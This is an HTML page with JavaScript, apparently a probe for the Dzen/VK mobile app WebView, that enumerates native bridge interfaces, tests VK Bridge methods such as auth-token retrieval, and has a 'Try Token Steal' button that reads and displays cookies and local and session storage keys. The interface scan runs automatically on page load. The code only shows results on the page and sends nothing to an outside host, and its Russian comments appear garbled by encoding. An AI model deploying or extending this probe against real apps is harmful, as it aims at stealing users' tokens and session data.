<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dzen Interface Check</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background: #1a1a1a;
            color: #fff;
        }
        h1 { color: #00ff00; }
        #results {
            background: #000;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            white-space: pre-wrap;
            word-break: break-all;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        .found { color: #00ff00; }
        .info { color: #ffff00; }
        button {
            padding: 15px 30px;
            font-size: 16px;
            background: #00ff00;
            color: #000;
            border: none;
            border-radius: 8px;
            margin: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>üîç Dzen WebView Interface Scanner</h1>
    
    <button onclick="scanInterfaces()">Scan All Interfaces</button>
    <button onclick="scanVK()">Test VK Interfaces</button>
    <button onclick="scanZen()">Test Zen Interfaces</button>
    <button onclick="tryExploit()">Try Token Steal</button>
    
    <div id="results">–ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è...</div>

    <script>
        var resultsDiv = document.getElementById('results');
        
        function log(msg, className) {
            resultsDiv.innerHTML += '<span class="' + (className || '') + '">' + msg + '</span>\n';
        }
        
        function scanInterfaces() {
            resultsDiv.innerHTML = '';
            log('=== SCANNING WINDOW OBJECT ===\n', 'info');
            
            var found = [];
            var patterns = ['VK', 'Zen', 'Android', 'webkit', 'native', 'app', 'bridge', 'JSBridge', 'Yandex', 'dzen'];
            
            for (var key in window) {
                try {
                    var lowerKey = key.toLowerCase();
                    for (var i = 0; i < patterns.length; i++) {
                        if (lowerKey.indexOf(patterns[i].toLowerCase()) !== -1) {
                            var type = typeof window[key];
                            found.push(key + ' : ' + type);
                            log('‚úì ' + key + ' : ' + type, 'found');
                            
                            // –ï—Å–ª–∏ —ç—Ç–æ –æ–±—ä–µ–∫—Ç, –ø–æ–∫–∞–∂–µ–º –µ–≥–æ –º–µ—Ç–æ–¥—ã
                            if (type === 'object' && window[key] !== null) {
                                try {
                                    var methods = Object.keys(window[key]);
                                    if (methods.length > 0 && methods.length < 20) {
                                        log('  ‚îî‚îÄ methods: ' + methods.join(', '), 'info');
                                    }
                                } catch(e) {}
                            }
                            break;
                        }
                    }
                } catch(e) {}
            }
            
            if (found.length === 0) {
                log('\nNo suspicious interfaces found in window object', '');
            }
            
            log('\n=== TOTAL: ' + found.length + ' interfaces ===', 'info');
        }
        
        function scanVK() {
            resultsDiv.innerHTML = '';
            log('=== TESTING VK INTERFACES ===\n', 'info');
            
            var vkInterfaces = [
                'VKWebAppInit',
                'VKWebAppGetUserInfo', 
                'VKWebAppGetAuthToken',
                'VKWebAppGetEmail',
                'VKWebAppGetPhoneNumber',
                'VKWebAppGetGeodata',
                'VKWebAppOpenPayForm',
                'VKWebAppCallAPIMethod',
                'VKWebAppStorageGet',
                'VKWebAppStorageSet'
            ];
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º VK Bridge
            if (typeof window.vkBridge !== 'undefined') {
                log('‚úì vkBridge FOUND!', 'found');
                try {
                    log('  Methods: ' + Object.keys(window.vkBridge).join(', '), 'info');
                } catch(e) {}
            }
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º VKWebAppAPI
            for (var i = 0; i < vkInterfaces.length; i++) {
                if (typeof window[vkInterfaces[i]] !== 'undefined') {
                    log('‚úì ' + vkInterfaces[i] + ' FOUND!', 'found');
                }
            }
            
            // –ü—Ä–æ–±—É–µ–º –≤—ã–∑–≤–∞—Ç—å —á–µ—Ä–µ–∑ postMessage
            log('\n=== TRYING POSTMESSAGE ===', 'info');
            try {
                window.postMessage(JSON.stringify({
                    handler: 'VKWebAppInit',
                    params: {}
                }), '*');
                log('postMessage sent (check console)', '');
            } catch(e) {
                log('postMessage error: ' + e, '');
            }
        }
        
        function scanZen() {
            resultsDiv.innerHTML = '';
            log('=== TESTING ZEN INTERFACES ===\n', 'info');
            
            var zenInterfaces = [
                'ZenKit',
                'ZenBridge', 
                'ZenWebApp',
                'zenNative',
                'DzenKit',
                'dzenNative',
                'AndroidBridge',
                'NativeBridge'
            ];
            
            for (var i = 0; i < zenInterfaces.length; i++) {
                if (typeof window[zenInterfaces[i]] !== 'undefined') {
                    log('‚úì ' + zenInterfaces[i] + ' FOUND!', 'found');
                    try {
                        var methods = Object.keys(window[zenInterfaces[i]]);
                        log('  Methods: ' + methods.join(', '), 'info');
                    } catch(e) {}
                } else {
                    log('‚úó ' + zenInterfaces[i] + ' not found', '');
                }
            }
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º Android WebView interface
            if (typeof window.Android !== 'undefined') {
                log('\n‚úì Android INTERFACE FOUND!', 'found');
                try {
                    var methods = Object.getOwnPropertyNames(window.Android);
                    log('  Methods: ' + methods.join(', '), 'info');
                } catch(e) {}
            }
        }
        
        function tryExploit() {
            resultsDiv.innerHTML = '';
            log('=== ATTEMPTING EXPLOITS ===\n', 'info');
            
            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å cookies
            log('Cookies: ' + document.cookie, 'info');
            
            // –ü—Ä–æ–±—É–µ–º localStorage
            try {
                log('\nlocalStorage keys: ' + Object.keys(localStorage).join(', '), 'info');
            } catch(e) {
                log('localStorage error: ' + e, '');
            }
            
            // –ü—Ä–æ–±—É–µ–º sessionStorage  
            try {
                log('\nsessionStorage keys: ' + Object.keys(sessionStorage).join(', '), 'info');
            } catch(e) {
                log('sessionStorage error: ' + e, '');
            }
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º URL
            log('\nCurrent URL: ' + window.location.href, 'info');
            log('Origin: ' + window.location.origin, 'info');
            
            // User Agent
            log('\nUser-Agent: ' + navigator.userAgent, 'info');
        }
        
        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.onload = function() {
            scanInterfaces();
        };
    </script>
</body>
</html>
